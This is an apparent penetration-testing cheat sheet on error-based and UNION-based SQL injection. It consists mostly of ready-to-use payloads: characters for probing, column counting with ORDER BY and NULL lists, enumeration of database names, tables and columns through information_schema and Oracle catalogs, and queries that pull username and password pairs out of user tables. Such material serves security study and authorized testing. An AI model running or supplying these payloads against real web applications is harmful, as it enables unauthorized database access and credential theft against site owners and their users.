This type of SQL injection is the most useful for easily obtaining information about the database structure because database error messages are printed directly on the browser screen.

[SQL injection cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)

## Discovering SQLi 

The key to discovering error-based SQL injection is to: 

- Break the SQL query by trying certain characters until an error message is produced; these are most often characters like:

```sh
' -> %27
" -> %22
# -> %23
; -> %3B
) -> %29
```

> Receiving an error message confirms the existence of a SQL Injection vulnerability

## UNION Injection

This type of injection uses the SQL UNION operator with a SELECT statement to return additional results to the page.

**1 - Return data to the browser without displaying an error message.**

```sql
?id=0 UNION SELECT 1
```

This statement produces an error message informing you that `the UNION SELECT statement has a different number of columns than the original SELECT query.`

Let's try adding another column until the error message disappears:

```sql
?id=1 UNION SELECT 1,2,...
```

**2 - Display our data**

This can simply be done by changing the article ID from `1 to 0`

```sql
?id=0 UNION SELECT 1,2,...
```

Now the article is simply composed of the result of the UNION select

**3 - Retrieve more useful information.**

We can replace 1 with `null`

```sql
-- Get the database name:
0 UNION SELECT 1,2,database()

-- Display server version
0 UNION SELECT null, version()
```

List tables that are in this database:

```sql
0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = '{db_name}'

-- or 

0 UNION SELECT null,table_name FROM INFORMATION_SCHEMA.tables

-- or on Oracle

0 UNION SELECT null,table_name FROM all_tables
```

Find the structure of tables (columns):

```sql
0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name = '{db_table_name}'

-- or 

0 UNION SELECT null,column_name FROM INFORMATION_SCHEMA.columns WHERE table_name='{db_table_name}'

-- or on Oracle

0 UNION SELECT null,column_name FROM all_tab_columns WHERE table_name='{db_table_name}'
```

Retrieve information:

```sql
0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>') FROM {db_table_name}

-- or 

0 UNION SELECT null, concat(user,0x0a,password) FROM {db_table_name}

-- or on Oracle and Postgres
0 UNION SELECT username || '~' || password FROM {db_table_name}--

```


### How to determine the number of columns required from the original query?

When performing a UNION SQL injection attack, there are two effective methods to determine the number of columns returned by the original query.

- One method is to inject a series of `ORDER BY` clauses and increment the specified column index until an error occurs.

```sql
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--

etc...
```

- The second method is to submit a series of `UNION SELECT` payloads specifying a different number of null values:

```sql
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--

etc...

' UNION SELECT NULL FROM DUAL--
```

- After determining the number of columns required, you can test each column to verify if it can contain `string type` data.

```sql
' UNION SELECT 'a',NULL,NULL,NULL--
' UNION SELECT NULL,'a',NULL,NULL--
' UNION SELECT NULL,NULL,'a',NULL--
' UNION SELECT NULL,NULL,NULL,'a'--

-- If the column's data type is not compatible with string data, the injected query will cause a database error (Conversion failed when converting the varchar value 'a' to data type int.)

-- If no error occurs and the application's response contains additional content, including the injected string value, then the corresponding column is suitable for retrieving string data.
```

- When you have determined the number of columns returned by the original query and found which columns can contain string data, you are able to retrieve interesting data.

- Retrieving multiple values in a single column

```sql
' UNION SELECT username || '~' || password FROM users--
```
